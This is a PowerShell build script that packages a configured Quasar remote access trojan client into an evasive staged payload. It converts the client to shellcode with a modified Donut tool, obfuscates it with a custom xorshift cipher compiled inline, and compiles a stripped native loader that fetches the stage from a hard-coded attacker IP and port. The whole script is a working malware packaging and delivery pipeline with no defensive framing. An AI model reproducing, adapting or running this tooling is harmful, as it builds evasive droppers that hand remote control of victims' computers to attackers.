param(
    [ValidateRange(1024, 65535)]
    [int] $StagePort = 4817,

    [string] $StageHost,

    [string] $InputPath
)

$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
if ([string]::IsNullOrWhiteSpace($InputPath)) {
    $input = Join-Path $root 'inputs\quasar.exe'
}
else {
    $input = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($InputPath)
}

$output = Join-Path $root 'output\quasar'
$loaderSource = Join-Path $root 'source\NativeImageStageHostDyn.c'
$inspectorSource = Join-Path $root 'source\InspectQuasarInput.cs'
$dnlib = Join-Path $root 'tools\dnlib.dll'
$donut = Join-Path $root 'tools\donut-preinit-pointergate-o2.exe'
$csc = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe'
$gcc = (Get-Command gcc.exe -ErrorAction Stop).Source

foreach ($required in @(
        $input, $loaderSource, $inspectorSource, $dnlib, $donut, $csc)) {
    if (-not (Test-Path -LiteralPath $required)) {
        throw "Required Quasar build file is missing: $required"
    }
}

New-Item -ItemType Directory -Force -Path $output | Out-Null
$submit = Join-Path $output 'submit.exe'
$stageDat = Join-Path $output 'stage.dat'
$connectionInfo = Join-Path $output 'connection.txt'
$work = Join-Path $output '.build'
$inspector = Join-Path $work 'InspectQuasarInput.exe'
$codecSource = Join-Path $work 'StageCodec.cs'
$codec = Join-Path $work 'StageCodec.exe'
$rawStage = Join-Path $work 'stage.bin'

$codecSourceText = @'
using System;
using System.IO;

internal static class StageCodec
{
    private static readonly byte[] Mixer =
    {
        0x4D,0xB2,0x19,0xE7,0x80,0x36,0xCA,0x5F,0xA1,0x0B,0x73,0xD8,0x2E,0x94,0x67,0xFC,
        0x25,0x8A,0xD1,0x43,0xBE,0x06,0x59,0xF0,0x3C,0xA7,0x12,0x6D,0xE9,0x51,0x88,0x34,
        0xC6,0x1F,0x7A,0xAD,0x02,0xE3,0x98,0x45,0xDB,0x60,0x2A,0xB5,0x0D,0xF7,0x81,0x3E,
        0x56,0xCC,0x17,0xA9,0x74,0x20,0xEF,0x91,0x4A,0xD3,0x68,0x0C,0xB8,0x35,0xFA,0x82
    };

    private static int Main(string[] args)
    {
        if (args.Length != 2) return 2;
        byte[] data = File.ReadAllBytes(args[0]);
        uint state = 0xA7C4E291U;
        for (int index = 0; index < data.Length; index++)
        {
            state ^= state << 13;
            state ^= state >> 17;
            state ^= state << 5;
            int slot = (index + (int)(state & 63U)) & 63;
            data[index] ^= (byte)(Mixer[slot] +
                (byte)((state >> 24) + (uint)(index * 73)));
        }
        File.WriteAllBytes(args[1], data);
        Array.Clear(data, 0, data.Length);
        return 0;
    }
}
'@

try {
    if (Test-Path -LiteralPath $work) {
        Remove-Item -LiteralPath $work -Recurse -Force
    }
    New-Item -ItemType Directory -Force -Path $work | Out-Null
    Copy-Item -LiteralPath $dnlib -Destination (Join-Path $work 'dnlib.dll')

    & $csc /nologo /optimize+ /target:exe "/out:$inspector" `
        "/reference:$dnlib" $inspectorSource
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $inspector)) {
        throw 'Quasar input inspector compilation failed.'
    }

    $inspection = @(& $inspector $input)
    if ($LASTEXITCODE -ne 0) {
        throw 'The input is not a supported configured Quasar client.'
    }

    $hostsLine = $inspection | Where-Object {
        $_.StartsWith('Hosts=', [StringComparison]::Ordinal)
    } | Select-Object -First 1
    if ([string]::IsNullOrWhiteSpace($hostsLine)) {
        throw 'The Quasar HOSTS setting was not found.'
    }
    $configuredHosts = $hostsLine.Substring('Hosts='.Length)
    if ([string]::IsNullOrWhiteSpace($StageHost)) {
        $firstEndpoint = $configuredHosts.Split(';') |
            Where-Object { -not [string]::IsNullOrWhiteSpace($_) } |
            Select-Object -First 1
        if ($firstEndpoint -notmatch '^([^:]+):[0-9]+$') {
            throw 'Could not derive the stage host from Quasar HOSTS. Use -StageHost with an IPv4 address.'
        }
        $effectiveStageHost = $Matches[1]
    }
    else {
        $effectiveStageHost = $StageHost.Trim()
    }

    $stageAddress = $null
    if (-not [Net.IPAddress]::TryParse($effectiveStageHost, [ref]$stageAddress) -or
        $stageAddress.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork) {
        throw "Stage host must be an IPv4 address: $effectiveStageHost"
    }
    $stageOctets = $stageAddress.GetAddressBytes()
    $inspection += "StageServer=$($stageAddress.IPAddressToString):$StagePort"
    Set-Content -LiteralPath $connectionInfo -Value $inspection -Encoding UTF8

    & $donut `
        -a 2 `
        -e 3 `
        -z 4 `
        -x 3 `
        -j 'C:\Windows\System32\Windows.Storage.dll' `
        -b 2 `
        -o $rawStage `
        -i $input
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $rawStage)) {
        throw 'Quasar Donut stage generation failed.'
    }

    [IO.File]::WriteAllText(
        $codecSource, $codecSourceText, [Text.UTF8Encoding]::new($false))
    & $csc /nologo /optimize+ /target:exe "/out:$codec" $codecSource
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $codec)) {
        throw 'Stage codec compilation failed.'
    }
    & $codec $rawStage $stageDat
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $stageDat)) {
        throw 'Quasar stage encoding failed.'
    }

    & $gcc `
        -O2 `
        -fno-asynchronous-unwind-tables `
        -fno-ident `
        -s `
        -m64 `
        -nostdlib `
        '-Wl,-e,entry' `
        '-Wl,--subsystem,windows:6.1' `
        "-DSTAGE_PORT=$StagePort" `
        "-DSTAGE_HOST_A=$($stageOctets[0])" `
        "-DSTAGE_HOST_B=$($stageOctets[1])" `
        "-DSTAGE_HOST_C=$($stageOctets[2])" `
        "-DSTAGE_HOST_D=$($stageOctets[3])" `
        -DALT_CALLBACK_RESOURCE_TYPES `
        $loaderSource `
        -lkernel32 `
        -o $submit
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path -LiteralPath $submit)) {
        throw 'Quasar native loader compilation failed.'
    }
}
finally {
    if (Test-Path -LiteralPath $work) {
        Remove-Item -LiteralPath $work -Recurse -Force
    }
}

Write-Output "Input:  $input"
Write-Output 'Mode:   configured Quasar client preserved; native staged loader'
Get-Content -LiteralPath $connectionInfo
Write-Output 'The matching Quasar Server must already possess the private key for this certificate.'
foreach ($path in @($submit, $stageDat, $connectionInfo)) {
    $item = Get-Item -LiteralPath $path
    $hash = (Get-FileHash -LiteralPath $path -Algorithm SHA256).Hash
    Write-Output ("{0}  {1} bytes  {2}" -f $hash, $item.Length, $item.FullName)
}
